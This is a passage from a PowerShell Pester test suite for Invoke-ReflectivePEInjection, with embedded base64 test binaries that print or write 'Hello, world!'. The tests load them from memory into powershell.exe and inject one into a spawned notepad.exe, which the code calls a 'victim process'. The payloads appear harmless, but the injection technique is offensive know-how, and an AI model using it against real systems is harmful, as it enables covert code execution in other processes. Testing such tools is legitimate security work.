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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAJgQAABAIgAAmBAAAHwRAABQIgAAfBEAAIwRAABoIgAAjBEAAFoSAAB4IgAAXBIAAL8SAACAIgAAwBIAADAUAACIIgAAMBQAAEIUAAB4IgAARBQAAHwUAAB4IgAAfBQAAJMUAAB4IgAA8BQAAD0VAACoIgAAcBUAABwWAADMIgAAIBYAAG4WAAAAIwAAcBYAACAXAADYIgAAIBcAADcXAAB4IgAAOBcAAHAXAAAIIwAAcBcAAKgXAAAIIwAA4BcAAP4XAAD4IgAAABgAACAYAAD4IgAAIBgAADsYAAD4IgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAFAAAACihQKFIoVChCKIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=='
	$Encoded32BitExe = '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'

	$WideStrDllBytes32 = [Convert]::FromBase64String($Encoded32BitWStringDll)
	$StrDllBytes32 = [Convert]::FromBase64String($Encoded32BitStringDll)
	$VoidDllBytes32 = [Convert]::FromBase64String($Encoded32BitVoidDll)
	$WideStrDllBytes64 = [Convert]::FromBase64String($Encoded64BitWStringDll)
	$StrDllBytes64 = [Convert]::FromBase64String($Encoded64BitStringDll)
	$VoidDllBytes64 = [Convert]::FromBase64String($Encoded64BitVoidDll)
	$ExeBytes32 = [Convert]::FromBase64String($Encoded32BitExe)
	$ExeBytes64 = [Convert]::FromBase64String($Encoded64BitExe)

	if ([IntPtr]::Size -eq 4) {
		$PowerShell32bit = $True
		$WideStrDllBytes = $WideStrDllBytes32
		$StrDllBytes = $StrDllBytes32
		$VoidDllBytes = $VoidDllBytes32
		$ExeBytes = $ExeBytes32
	} else {
		$PowerShell32bit = $False
		$WideStrDllBytes = $WideStrDllBytes64
		$StrDllBytes = $StrDllBytes64
		$VoidDllBytes = $VoidDllBytes64
		$ExeBytes = $ExeBytes64
	}

	Context 'DLL loading' {
		It 'should load a DLL (wchar_t*) in memory within powershell.exe and returns "Hello, world!"' {
			$Result = Invoke-ReflectivePEInjection -PEBytes $WideStrDllBytes -FuncReturnType WString -DoNotZeroMZ

			$Result | Should Not BeNullOrEmpty
			$Result | Should Be 'Hello, world!'
		}

		It 'should load a DLL (char*) in memory within powershell.exe and returns "Hello, world!"' {
			$Result = Invoke-ReflectivePEInjection -PEBytes $StrDllBytes -FuncReturnType String -DoNotZeroMZ

			$Result | Should Not BeNullOrEmpty
			$Result | Should Be 'Hello, world!'
		}

		It 'should load a DLL (void) in memory within powershell.exe and writes "Hello, world!" to %TEMP%\testoutput.txt' {
			$TestOutputPath = Join-Path $Env:TEMP 'testoutput.txt'
			if (Test-Path $TestOutputPath) { Remove-Item $TestOutputPath }

			Invoke-ReflectivePEInjection -PEBytes $VoidDllBytes -FuncReturnType Void -DoNotZeroMZ

			Start-Sleep -Seconds 2
			$TestOutputPath | Should Exist
			$Result = Get-Content $TestOutputPath

			$Result | Should Not BeNullOrEmpty
			$Result | Should Be 'Hello, world!'
		}

		It 'should load a DLL (void) in memory within notepad.exe and write "Hello, world!" to %TEMP%\testoutput.txt' {
			$64BitOS = $False
			if ($Env:ProgramW6432) { $64BitOS = $True }

			# When launching notepad.exe, the bitness of the process needs to match that of powershell.exe
			if ($PowerShell32bit -and $64BitOS) {
				# 32-bit PowerShell on a 64-bit OS needs to launch Wow64 notepad
				$NotepadPath = "$($Env:SystemRoot)\SysWow64\notepad.exe"
			} else {
				$NotepadPath = "$($Env:SystemRoot)\System32\notepad.exe"
			}

			$NotepadProc = Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $NotepadPath

			if ($NotepadProc.ReturnValue -ne 0) {
				throw 'Could not start victim process: notepad.exe'
			} 

			$VictimPID = $NotepadProc.ProcessId

			$TestOutputPath = Join-Path $Env:TEMP 'testoutput.txt'
			if (Test-Path $TestOutputPath) { Remove-Item $TestOutputPath }

			Invoke-ReflectivePEInjection -PEBytes $VoidDllBytes -ProcId $VictimPID -DoNotZeroMZ

			$Result = Get-Content $TestOutputPath

			Start-Sleep -Seconds 2

			Stop-Process -Id $VictimPID

			$Result | Should Not BeNullOrEmpty
			$Result | Should Be 'Hello, world!'
		}

		It 'should not load a DLL in memory within powershell.exe when the bitness of powershell.exe and the DLL do not match.' {
			if ($PowerShell32bit) {
				$PEBytes = $WideStrDllBytes64
			} else {
				$PEBytes = $WideStrDllBytes32
			}

			# Attempt to load the wide string DLL in memory with a mismatched bitness
			{ Invoke-ReflectivePEInjection -PEBytes $PEBytes -FuncReturnType WString -DoNotZeroMZ } | Should Throw
		}

		It 'should not load a DLL in memory within powershell.exe when the return types do not match.' {
			# This DLL exports WStringFunc which means that -FunReturnType should be WString
			{ $Result = Invoke-ReflectivePEInjection -PEBytes $WideStrDllBytes -FuncReturnType String -DoNotZeroMZ } | Should Throw
		}
	}

	Context 'EXE Loading' {
